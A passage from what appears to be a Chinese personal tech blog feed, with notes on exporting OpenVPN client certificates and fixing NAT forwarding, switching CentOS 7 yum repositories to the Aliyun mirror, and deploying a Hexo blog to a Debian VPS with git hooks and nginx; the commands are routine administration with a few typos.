title="导出保存openvpn客户端证书相关文件"></a>导出保存openvpn客户端证书相关文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">汇总拷贝整理客户端相关证书文件</span></span><br><span class="line">[root@localhost client]# cp ~/easy-rsa-old-master/easy-rsa/2.0/keys/client.key /root/client/</span><br><span class="line">[root@localhost client]# cp ~/easy-rsa-old-master/easy-rsa/2.0/keys/client.crt /root/client/</span><br><span class="line">[root@localhost client]# cp ~/easy-rsa-old-master/easy-rsa/2.0/keys/ca.crt /root/client/</span><br><span class="line">[root@localhost client]# cp /etc/openvpn/keys/ta.key /root/client/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查信息</span></span><br><span class="line">[root@localhost client]# ll</span><br><span class="line">total 24</span><br><span class="line">-rw-r--r--. 1 root root 2329 Dec 10 20:28 ca.crt</span><br><span class="line">-rw-r--r--. 1 root root 3614 Dec 10 20:26 client.conf</span><br><span class="line">-rw-r--r--. 1 root root 7937 Dec 10 20:28 client.crt</span><br><span class="line">-rw-------. 1 root root 3268 Dec 10 20:28 client.key</span><br><span class="line">-rw-------. 1 root root  636 Dec 10 20:29 ta.key</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改客户端文件后缀名称信息</span></span><br><span class="line">[root@localhost client]# pwd</span><br><span class="line">/root/client</span><br><span class="line">[root@localhost client]# mv client.conf client.ovpn</span><br><span class="line">[root@localhost client]# ll client.ovpn </span><br><span class="line">-rw-r--r--. 1 root root 3614 Dec 10 20:26 client.ovpn</span><br></pre></td></tr></table></figure><p>将所有openvpn客户端所需文件数据打包并下载保存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# pwd</span><br><span class="line">/root</span><br><span class="line">[root@localhost ~]# zip client.zip client/*</span><br><span class="line">  adding: client/ca.crt (deflated 31%)</span><br><span class="line">  adding: client/client.crt (deflated 46%)</span><br><span class="line">  adding: client/client.key (deflated 24%)</span><br><span class="line">  adding: client/client.ovpn (deflated 54%)</span><br><span class="line">  adding: client/ta.key (deflated 40%)</span><br><span class="line">[root@localhost ~]# ll  client.zip</span><br><span class="line">-rw-r--r--. 1 root root 11222 Dec 10 20:43 client.zip</span><br><span class="line">[root@localhost ~]# sz -y client.zip</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241210204357494.png" alt="image-20241210204357494"></p><h3 id="下载windows使用的客户端"><a href="#下载windows使用的客户端" class="headerlink" title="下载windows使用的客户端"></a>下载windows使用的客户端</h3><ul><li><a href="https://openvpn.net/community-downloads/">https://openvpn.net/community-downloads/</a></li></ul><p><img src="/../image/image-20241210204810146.png" alt="image-20241210204810146"></p><p>下载好对应的文件，一直下一步即可</p><p>运行启动客户端软件程序，并将之前下载的客户端相关证书与配置文件导入到客户端软件程序中:</p><p><img src="/../image/image-20241210210212424.png" alt="image-20241210210212424"></p><p>修改客户端程序设置中的高级选项配置信息，双击是不会跳出来的，右键右下角的隐藏图标才可以，选择选项</p><p><img src="/../image/image-20241210210422618.png" alt="image-20241210210422618"></p><p><img src="/../image/image-20241210210330867.png" alt="image-20241210210330867"></p><p>然后再右键这个图标，选择client节点，选择连接</p><p><img src="/../image/image-20241210210545427.png" alt="image-20241210210545427"></p><p><img src="/../image/image-20241210210533157.png" alt="image-20241210210533157"></p><p>在ipconfig中也可以看到配置</p><p><img src="/../image/image-20241210210737855.png" alt="image-20241210210737855"></p><p>我们进入网络适配器看看具体信息</p><p><img src="/../image/image-20241210211214903.png" alt="image-20241210211214903"></p><p>那说明我们服务端也该有个ip才对</p><p><img src="/../image/image-20241210211409377.png" alt="image-20241210211409377"></p><h3 id="测试连通性，以及问题解决"><a href="#测试连通性，以及问题解决" class="headerlink" title="测试连通性，以及问题解决"></a>测试连通性，以及问题解决</h3><ul><li>客户端<ul><li>10.8.0.6</li></ul></li><li>服务端<ul><li>10.8.0.1</li><li>内网卡: 172.16.30.102</li><li>内网主机：172.16.30.101</li></ul></li></ul><p>客户端ping服务端</p><p><img src="/../image/image-20241210215126448.png" alt="image-20241210215126448"></p><p>ping不通内网的web服务器。。。</p><p>试试服务端ping客户端</p><p><img src="/../image/image-20241210215250320.png" alt="image-20241210215250320"></p><p>ping不通客户端的地址，不懂为什么，试着换了下vm的windows，就可以了</p><p><img src="/../image/image-20241211102235401.png" alt="image-20241211102235401"></p><p>win-ipconfig</p><p><img src="/../image/image-20241211102325191.png" alt="image-20241211102325191"></p><h3 id="服务端配置nat转发"><a href="#服务端配置nat转发" class="headerlink" title="服务端配置nat转发"></a>服务端配置nat转发</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -j MASQUERADE</span><br><span class="line"># 有些可能会有问题，可以按下面这个配置</span><br><span class="line">[root@localhost ccd]# iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o ens36 -j MASQUERADE</span><br><span class="line">[root@localhost ccd]# iptables -I FORWARD 1 -i tun0 -o ens36 -j ACCEPT</span><br><span class="line">[root@localhost ccd]# iptables -I FORWARD 1 -i ens36 -o tun0 -j ACCEPT</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241211113846941.png" alt="image-20241211113846941"></p><p>但还是ping不通，但ping 10.8.0.1是通的，监听一下网卡tun0看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost openvpn]# tcpdump -i tun0</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241211113941437.png" alt="image-20241211113941437"></p><p>可以看到是有数据包过来的，应该是准发规则没做好,搜了下，找到 一篇文章，重新配置过nat，就可以了</p><p><img src="/../image/image-20241211121717810.png" alt="image-20241211121717810"></p><p><img src="/../image/image-20241211121737877.png" alt="image-20241211121737877"></p><h2 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h2><p>之前不是搭建了简单的web站点在30.101，我们现在客户端上访问试试</p><p><img src="/../image/image-20241211121944045.png" alt="image-20241211121944045"></p><p>可以看到也是成功访问到了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> openvpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS_换源</title>
      <link href="/2024/12/05/CentOS-%E6%8D%A2%E6%BA%90/"/>
      <url>/2024/12/05/CentOS-%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CentOS-换源"><a href="#CentOS-换源" class="headerlink" title="CentOS_换源"></a>CentOS_换源</h1><p>根据 CentOS 官方公告，CentOS 7 已经于 2024 年 6 月 30 日结束支持，其<a href="https://marketing.csdn.net/p/3127db09a98e0723b83b2914d9256174?pId=2782&utm_source=glcblog&spm=1001.2101.3001.7020">软件</a>仓库也相应被上游移除。</p><p>参考 ：</p><ul><li><a href="https://blog.csdn.net/m0_49605975/article/details/120039048">https://blog.csdn.net/m0_49605975/article/details/120039048</a></li></ul><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>如果有需要，可以打个快照</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_bak</span><br></pre></td></tr></table></figure><h2 id="准备阿里云的镜像源"><a href="#准备阿里云的镜像源" class="headerlink" title="准备阿里云的镜像源"></a>准备阿里云的镜像源</h2><ul><li><a href="http://mirrors.aliyun.com/repo/Centos-7.repo">http://mirrors.aliyun.com/repo/Centos-7.repo</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阿里源（推荐）：</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">网易源：</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS7-Base-163.repo</span><br></pre></td></tr></table></figure><p>手动创建一个</p><blockquote><p>#镜像系统使用客户端和服务器的连接IP地址</p><p>update每个镜像的状态，选择更新到和的镜像</p><p>#地理位置靠近客户端。您应该在CentOS更新中使用它</p><p>#除非您手动选择其他镜像。</p><p>#如果mirrorlist&#x3D;不适合你，作为退一步，你可以尝试</p><p>#注释掉baseurl&#x3D; line。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CentOS-Base.repo</span><br><span class="line">#</span><br><span class="line"># The mirror system uses the connecting IP address of the client and the</span><br><span class="line"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="line"># geographically close to the client.  You should use this for CentOS updates</span><br><span class="line"># unless you are manually picking other mirrors.</span><br><span class="line">#</span><br><span class="line"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="line"># remarked out baseurl= line instead.</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line">[base]</span><br><span class="line">name=CentOS-7 - Base - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/os/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/os/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class="line"> </span><br><span class="line">#released updates </span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-7 - Updates - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/updates/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/updates/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class="line"> </span><br><span class="line">#additional packages that may be useful</span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-7 - Extras - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/extras/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/extras/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/extras/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class="line"> </span><br><span class="line">#additional packages that extend functionality of existing packages</span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-7 - Plus - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/centosplus/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/centosplus/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/centosplus/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class="line"> </span><br><span class="line">#contrib - packages by Centos Users</span><br><span class="line">[contrib]</span><br><span class="line">name=CentOS-7 - Contrib - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/contrib/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/contrib/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/contrib/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后续会看一下这些连接的意思</p><h2 id="清理yum缓存，并生成新的缓存"><a href="#清理yum缓存，并生成新的缓存" class="headerlink" title="清理yum缓存，并生成新的缓存"></a>清理yum缓存，并生成新的缓存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all </span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h2 id="更新yum源检查是否生效"><a href="#更新yum源检查是否生效" class="headerlink" title="更新yum源检查是否生效"></a>更新yum源检查是否生效</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y update：升级所有包同时也升级软件和系统内核；</span><br><span class="line">yum -y upgrade：只升级所有包，不升级软件和系统内核。</span><br></pre></td></tr></table></figure><p>我们用yum -y upgrade试试</p><p><img src="/../image/image-20241205222602455.png" alt="image-20241205222602455"></p><p>如果是update，更新后的系统是<code>CentOS Linux release 7.9.2009 (Core)</code></p><p>简单的把他集合成一个sh脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 备份当前的 yum 源配置文件</span></span><br><span class="line"><span class="built_in">cp</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak</span><br><span class="line"><span class="comment"># 下载阿里云的 yum 源配置文件并替换原有配置文件</span></span><br><span class="line">wget -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"><span class="comment"># 清除 yum 缓存</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="comment"># 生成新的缓存</span></span><br><span class="line">yum makecache</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;CentOS yum 源已切换为阿里云源&quot;</span></span><br></pre></td></tr></table></figure><h2 id="CentOS-Base-repo分析"><a href="#CentOS-Base-repo分析" class="headerlink" title="CentOS-Base.repo分析"></a>CentOS-Base.repo分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[base]</span><br><span class="line">name=CentOS-7 - Base - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/os/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/os/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure><p>【base】提供了 CentOS 7 的基本软件包，可以通过这个仓库获取操作系统的核心组件和功能。</p><ul><li><code>name</code>: 仓库的名称，即 CentOS-7 - Base - mirrors.aliyun.com。</li><li><code>failovermethod</code>: 定义了当多个镜像源提供相同软件包时的优先级选择方法。</li><li><code>baseurl</code>: 包含软件包的下载地址，<code>$basearch</code> 是一个变量，代表系统的架构。</li><li><code>gpgcheck</code>: 表示是否要检查软件包的 GPG 签名以验证其真实性。</li><li><code>gpgkey</code>: 指定了用于验证软件包真实性的 GPG 密钥的地址。</li></ul><p>GPG:<a href="https://ruanyifeng.com/blog/2013/07/gpg.html">GPG入门教程- 阮一峰</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[updates]</span><br><span class="line">name=CentOS-7 - Updates - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/updates/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/updates/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure><p>这个 <code>[updates]</code> 仓库提供了 CentOS 7 更新的软件包，可以通过这个仓库获取系统的更新和修复程序。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[extras]</span><br><span class="line">name=CentOS-7 - Extras - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/extras/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/extras/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/extras/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure><p>这个 <code>[extras]</code> 仓库提供了 CentOS 7 的额外软件包，可以通过这个仓库获取一些附加的软件包和功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[contrib]</span><br><span class="line">name=CentOS-7 - Contrib - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/7/contrib/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos/7/contrib/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos/7/contrib/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure><p>这个 <code>[contrib]</code> 仓库提供了 CentOS 7 的贡献软件包，这些软件包可能由社区成员提供，不属于官方的 CentOS 发行版。</p><h2 id="epel源"><a href="#epel源" class="headerlink" title="epel源"></a>epel源</h2><p>epel源为“红帽系”的操作系统提供的额外的软件包</p><p><a href="http://mirrors.aliyun.com/repo/Centos-7.repo">http://mirrors.aliyun.com/repo/Centos-7.repo</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客</title>
      <link href="/2024/12/03/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/12/03/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><p>参考链接：</p><ul><li><a href="https://juejin.cn/post/6844903700725497863?from=search-suggest">https://juejin.cn/post/6844903700725497863?from=search-suggest</a></li><li><a href="https://blog.peiyingchi.com/2017/03/20/deploy-hexo-blog-to-VPS/">https://blog.peiyingchi.com/2017/03/20/deploy-hexo-blog-to-VPS/</a></li><li><a href="https://zhouw.top/2023/02/25/hexo%20+%20vps%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">https://zhouw.top/2023/02/25/hexo%20+%20vps%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</a></li><li><a href="https://blog.zhheo.com/p/12a4e7e6.html">https://blog.zhheo.com/p/12a4e7e6.html</a></li><li><a href="https://www.bilibili.com/video/BV1QP4y1q7iK/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">https://www.bilibili.com/video/BV1QP4y1q7iK/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912</a></li></ul><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="vps环境"><a href="#vps环境" class="headerlink" title="vps环境"></a>vps环境</h3><p>我的vps是在阿里云买的，配置如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系系统：debian 12.6 64位</span><br><span class="line">CPU：2核</span><br><span class="line">内存：2G</span><br><span class="line">带宽：3M</span><br></pre></td></tr></table></figure><p>然后我们为了权限隔离，可以单独创建一个用户用来管理博客</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo adduser git</span><br><span class="line">sudo passwd git //设置密码</span><br></pre></td></tr></table></figure><h4 id="赋予git用户sudo权限"><a href="#赋予git用户sudo权限" class="headerlink" title="赋予git用户sudo权限"></a>赋予git用户sudo权限</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod 740 /etc/sudoers</span><br><span class="line">ls -l /etc/sudoers 可以先看一下权限分配，待会改完好改回来</span><br><span class="line">sudo vim /etc/sudoers //配置如下</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241203204454463.png" alt="image-20241203204454463"></p><p>保存退出后，该回去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod 440 /etc/sudoers</span><br></pre></td></tr></table></figure><h4 id="关闭git用户shell权限"><a href="#关闭git用户shell权限" class="headerlink" title="关闭git用户shell权限"></a>关闭git用户shell权限</h4><p>ssh 连接服务器，登录到服务器上，对服务器进行各种操作，这通常很不安全，也不合适，我们只需要能对仓库操作就可以了，不需要更大的权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/passwd //</span><br><span class="line">原文：</span><br><span class="line">git:x:1001:1001:,,,:/home/git:/bin/sh</span><br><span class="line">修改后：</span><br><span class="line">git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241203211236868.png" alt="image-20241203211236868"></p><h3 id="Git-shell没有启用"><a href="#Git-shell没有启用" class="headerlink" title="Git shell没有启用"></a><a href="https://cloud.tencent.com/developer/ask/sof/116908008">Git shell没有启用</a></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chsh -s $(command -v git-shell) &lt;user&gt; //命令指定用户</span><br><span class="line">cp /usr/share/doc/git/contrib/git-shell-commands /home/git/ -R //把git-shell的命令复制到git用户目录下</span><br><span class="line">chown git:git /home/git/git-shell-commands/ -R //权限控制</span><br><span class="line">chmod +x /home/git/git-shell-commands/help </span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241204170146409.png" alt="image-20241204170146409"></p><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">git --version</span><br><span class="line">//如果安装不成功，可以试一下更新一下</span><br><span class="line">apt update</span><br></pre></td></tr></table></figure><p>我这里的git版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian:~# git --version</span><br><span class="line">git version 2.39</span><br></pre></td></tr></table></figure><h4 id="初始化git仓库"><a href="#初始化git仓库" class="headerlink" title="初始化git仓库"></a>初始化git仓库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git</span><br><span class="line">mkdir youzipii.git //创建git仓库文件夹</span><br><span class="line">cd blog.git</span><br><span class="line">git init --bare //使用--bare参数初始化为裸仓库，这样创建的仓库不包含工作区</span><br></pre></td></tr></table></figure><ul><li><a href="https://cloud.tencent.com/developer/article/1825910">https://cloud.tencent.com/developer/article/1825910</a></li></ul><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git</span><br><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">vim authorized_keys</span><br></pre></td></tr></table></figure><p>这里需要把用户的公钥文件写入authorized_keys，如果没有可以用ssh-keygen生成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ssh-keygen -t rsa -C &quot;your_email&quot;</span><br></pre></td></tr></table></figure><p>如果怕复制出问题，可以用下面这个命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; /home/git/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><h4 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h4><p>确保 blog.git、.ssh、blog 目录的用户组权限为 git:git，若不是，执行下列命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /home/git/</span><br><span class="line">ll -l /var/www/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown -R git:git /目录</span><br></pre></td></tr></table></figure><h4 id="创建网站目录"><a href="#创建网站目录" class="headerlink" title="创建网站目录"></a>创建网站目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /ver/www/ //没有就创建一个</span><br><span class="line">mkdir blog </span><br></pre></td></tr></table></figure><h3 id="使用git-hooks同步网站根目录"><a href="#使用git-hooks同步网站根目录" class="headerlink" title="使用git-hooks同步网站根目录"></a>使用git-hooks同步网站根目录</h3><h4 id="创建post-receive文件"><a href="#创建post-receive文件" class="headerlink" title="创建post-receive文件"></a>创建post-receive文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/youzipii.git/hooks</span><br><span class="line">vim /pose-receive</span><br></pre></td></tr></table></figure><p>复制下面的内容到post-receive</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;post-receive hook is running...&quot;</span><br><span class="line">//没有目录可以先创建一个</span><br><span class="line">GIT_REPO=/home/git/youzipii.git</span><br><span class="line">TMP_GIT_CLONE=/tmp/blog</span><br><span class="line">PUBLIC_WWW=/var/www/blog</span><br><span class="line"></span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><ul><li><a href="https://www.runoob.com/w3cnote/nginx-setup-intro.html">https://www.runoob.com/w3cnote/nginx-setup-intro.html</a></li><li><a href="https://www.cnblogs.com/panchanggui/p/12067953.html">https://www.cnblogs.com/panchanggui/p/12067953.html</a></li><li><a href="https://wenku.csdn.net/answer/99c26bcf45e14855a533019c06909406">https://wenku.csdn.net/answer/99c26bcf45e14855a533019c06909406</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install nginx  //安装nginx</span><br><span class="line">systemctl start nginx   //启动nginx</span><br><span class="line">systemctl enable nginx  //开机启动</span><br><span class="line">systemctl status nginx //查看nginx运行状态</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241203210252768.png" alt="image-20241203210252768"></p><p>可以访问<a href="http://your-ip,看看是否显示nginx的默认页面/">http://your-ip，看看是否显示nginx的默认页面</a></p><p><img src="/../image/image-20241203210334823.png" alt="image-20241203210334823"></p><p>配置nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/nginx/sites-available //有些是改nginx.conf</span><br><span class="line"># 备份默认配置</span><br><span class="line">cp default default.bak</span><br><span class="line"># 修改配置</span><br><span class="line">vim default</span><br></pre></td></tr></table></figure><ul><li>(无域名配置nginx)<a href="https://blog.csdn.net/yxjie2/article/details/126163577">https://blog.csdn.net/yxjie2/article/details/126163577</a></li></ul><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span> default;              <span class="comment">#默认监听80端口</span></span><br><span class="line">    <span class="attribute">root</span> /var/www/blog;             <span class="comment">#网站根目录,可以自己在对应目录下搭建</span></span><br><span class="line">    <span class="attribute">server_name</span> <span class="number">127.0.0.1</span>;          <span class="comment">#自己的网址</span></span><br><span class="line">    <span class="attribute">access_log</span>  /var/log/nginx/blog_access.log;</span><br><span class="line">    <span class="attribute">error_log</span>   /var/log/nginx/blog_error.log;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> =  /<span class="number">404</span>.html;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* ^.+\.(ico|gif|jpg|jpeg|png)$</span> &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/blog;</span><br><span class="line">        <span class="attribute">access_log</span>   <span class="literal">off</span>;</span><br><span class="line">        <span class="attribute">expires</span>      <span class="number">1d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* ^.+\.(css|js|txt|xml|swf|wav)$</span> &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/blog;</span><br><span class="line">        <span class="attribute">access_log</span>   <span class="literal">off</span>;</span><br><span class="line">        <span class="attribute">expires</span>      <span class="number">10m</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/blog;</span><br><span class="line">        <span class="attribute">if</span> (-f <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span>  /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /nginx_status &#123;</span><br><span class="line">        <span class="attribute">stub_status</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -t //</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p>最后修改配置文件_-config.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repo: 